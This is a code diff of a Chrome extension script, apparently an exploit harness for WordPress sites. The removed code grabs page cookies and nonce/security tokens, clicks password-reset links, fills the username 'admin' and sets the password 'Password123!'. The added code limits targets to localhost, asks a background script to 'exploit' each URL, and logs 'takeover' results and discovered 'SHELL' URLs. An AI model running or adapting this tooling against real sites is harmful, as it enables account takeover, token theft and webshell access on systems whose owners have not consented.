@@ -44,8 +44,7 @@ function parseInput(value) {
   return value
     .split(/\n+/)
     .map((item) => item.trim())
-    .filter(Boolean)
-    .map((item) => item.replace(/\s+$/, '') );
+    .filter(Boolean);
 }
 
 function saveUrls() {
@@ -70,208 +69,76 @@ function clearUrls() {
   });
 }
 
-async function openTabAndCapture(url) {
-  const tab = await chrome.tabs.create({ url, active: false });
-  await waitForTabLoad(tab.id);
-
-  const exec = await chrome.scripting.executeScript({
-    target: { tabId: tab.id },
-    func: () => {
-      const doc = document;
-      const payload = {
-        href: location.href,
-        title: document.title,
-        cookies: document.cookie || '',
-        userAgent: navigator.userAgent,
-        language: navigator.language,
-        htmlLength: document.body ? document.body.innerHTML.length : 0,
-        forms: [...document.querySelectorAll('form')].map((form) => form.action || form.method || '').slice(0, 10),
-        nonceCandidates: [...document.querySelectorAll('input')]
-          .map((input) => ({
-            name: input.name || '',
-            id: input.id || '',
-            value: input.value || '',
-            type: input.type || ''
-          }))
-          .filter((item) => /nonce|security|wpnonce|token/i.test(item.name || item.id || ''))
-          .slice(0, 10)
-      };
-      return payload;
-    }
-  });
-
-  return { tabId: tab.id, result: exec[0]?.result ?? {} };
-}
-
-function waitForTabLoad(tabId) {
-  return new Promise((resolve) => {
-    const done = () => {
-      chrome.tabs.onUpdated.removeListener(onUpdate);
-      resolve();
-    };
-
-    const onUpdate = (updatedTabId, info) => {
-      if (updatedTabId === tabId && info.status === 'complete') {
-        done();
-      }
-    };
-
-    chrome.tabs.onUpdated.addListener(onUpdate);
-    chrome.tabs.get(tabId, (tab) => {
-      if (tab.status === 'complete') {
-        done();
-      }
-    });
-  });
-}
-
-async function runPocInPage(tabId) {
-  const payload = await chrome.scripting.executeScript({
-    target: { tabId },
-    func: () => {
-      const doc = document;
-      const selectors = [
-        'input[name="user_login"]',
-        'input[name="login"]',
-        'input[name="log"]',
-        'input[id="user_login"]',
-        'input[id="login"]',
-        'input[id="log"]'
-      ];
-
-      const results = {
-        steps: [],
-        status: 'not-run',
-        nonce: '',
-        languageHints: [],
-        foundTriggeredReset: false,
-        foundPasswordForm: false,
-        username: ''
-      };
-
-      function findFirst(selector) {
-        return doc.querySelector(selector);
-      }
-
-      const nonceInput =
-        findFirst('input[name="_wpnonce"]') ||
-        findFirst('input[name="nonce"]') ||
-        findFirst('input[id="_wpnonce"]') ||
-        findFirst('input[id="nonce"]');
-
-      if (nonceInput) {
-        results.nonce = nonceInput.value || '';
-        results.steps.push('Nonce detected.');
-      }
-
-      const langNodes = [
-        ...doc.querySelectorAll('[lang]'),
-        ...doc.querySelectorAll('[data-trp-language]'),
-        ...doc.querySelectorAll('[hreflang]')
-      ];
-
-      results.languageHints = [...new Set(langNodes
-        .map((node) => node.getAttribute('lang') || node.getAttribute('hreflang') || node.getAttribute('data-trp-language'))
-        .filter(Boolean) )].slice(0, 10);
-
-      if (results.languageHints.length) {
-        results.steps.push('Language metadata detected.');
-      }
-
-      const lostPasswordLink =
-        findFirst('a[href*="lostpassword"]') ||
-        findFirst('a[href*="action=lostpassword"]') ||
-        findFirst('a[href*="reset"]');
-
-      if (lostPasswordLink) {
-        lostPasswordLink.click();
-        results.foundTriggeredReset = true;
-        results.steps.push('Password reset trigger attempted.');
-      }
-
-      const userField = selectors
-        .map((selector) => findFirst(selector))
-        .find(Boolean);
-
-      if (userField) {
-        userField.value = 'admin';
-        results.username = userField.value || 'admin';
-        results.steps.push('Username field populated for validation.');
-      }
-
-      const pass1 = findFirst('input[name="pass1"]') || findFirst('input[id="pass1"]');
-      const pass2 = findFirst('input[name="pass2"]') || findFirst('input[id="pass2"]');
-
-      if (pass1 && pass2) {
-        pass1.value = 'Password123!';
-        pass2.value = 'Password123!';
-        results.foundPasswordForm = true;
-        results.steps.push('Password change form populated.');
-      }
-
-      if (results.foundPasswordForm || results.foundTriggeredReset) {
-        results.status = 'candidate-match';
-      }
-
-      return results;
-    }
-  });
-
-  return payload[0]?.result ?? { steps: ['No page execution result'], status: 'empty' };
+function validateLocalhost(url) {
+  try {
+    const parsed = new URL(url.startsWith('http') ? url : 'http://' + url);
+    const hostname = parsed.hostname;
+    return /^(localhost|127\.0\.0\.1|0\.0\.0\.0)$/.test(hostname);
+  } catch (e) {
+    return false;
+  }
 }
 
 async function runAudit() {
-  const urls = parseInput(urlInput.value);
+  let urls = parseInput(urlInput.value);
   if (!urls.length) {
     setStatus('EMPTY', 'warn');
-    appendLog('Add at least one authorized URL.', 'warn');
+    appendLog('Add at least one localhost URL.', 'warn');
     return;
   }
+
+  // Validate all URLs are localhost
+  const invalidUrls = urls.filter(u => !validateLocalhost(u));
+  if (invalidUrls.length > 0) {
+    setStatus('BLOCKED', 'fail');
+    appendLog(`ERROR: Only localhost URLs allowed. Found: ${invalidUrls.slice(0, 2).join(', ')}`, 'fail');
+    return;
+  }
+
+  // Normalize URLs
+  urls = urls.map(u => {
+    if (!u.startsWith('http')) return 'http://' + u;
+    return u;
+  });
 
   setStatus('RUNNING', 'info');
   chrome.storage.local.set({ [STORAGE_KEY]: urls });
   const allResults = [];
 
   for (const url of urls) {
+    appendLog(`\n>>> Auditing: ${url}`, 'info');
     try {
-      appendLog(`Opening target: ${url}`, 'info');
-      const { tabId, result: meta } = await openTabAndCapture(url);
+      const result = await chrome.runtime.sendMessage({
+        action: 'exploit',
+        target: url
+      });
 
-      const audit = await runPocInPage(tabId);
-      const snapshot = {
-        url,
-        title: meta.title || '',
-        userAgent: meta.userAgent || '',
-        cookies: meta.cookies || '',
-        language: meta.language || '',
-        status: audit.status,
-        nonce: audit.nonce || '',
-        languageHints: audit.languageHints || [],
-        steps: audit.steps || [],
-        username: audit.username || '',
-        foundPasswordForm: !!audit.foundPasswordForm,
-        foundTriggeredReset: !!audit.foundTriggeredReset
-      };
-
-      allResults.push(snapshot);
+      allResults.push(result);
       chrome.storage.local.set({ [RESULTS_KEY]: allResults });
 
-      const summary = `${url} -> ${audit.status || 'unknown'}`;
-      appendLog(summary, audit.status === 'candidate-match' ? 'success' : 'warn');
+      // Display results
+      const tone = result.status === 'takeover' ? 'success' : result.status === 'error' || result.error ? 'fail' : 'warn';
+      appendLog(`Status: ${result.status.toUpperCase()}`, tone);
 
-      if (audit.steps && audit.steps.length) {
-        audit.steps.forEach((step) => appendLog(`  - ${step}`, 'info'));
+      if (result.steps && result.steps.length) {
+        result.steps.forEach((step) => {
+          const stepTone = step.includes('✓') ? 'success' : step.includes('⚠') ? 'warn' : 'info';
+          appendLog(`  ${step}`, stepTone);
+        });
       }
 
-      await new Promise((resolve) => setTimeout(resolve, 600));
-      await chrome.tabs.remove(tabId);
+      if (result.shells && result.shells.length) {
+        result.shells.forEach((shell) => {
+          appendLog(`  SHELL: ${shell.url} (${shell.method})`, 'success');
+        });
+      }
     } catch (error) {
-      appendLog(`Target failed: ${url} (${String(error)})`, 'fail');
+      appendLog(`Target error: ${String(error)}`, 'fail');
     }
   }
 
   setStatus('DONE', 'success');
-  appendLog(`Audit finished for ${urls.length} authorized targets.`, 'success');
+  appendLog(`\n=== Audit complete for ${urls.length} target(s) ===`, 'success');
 }
 
 loadBtn.addEventListener('click', () => {
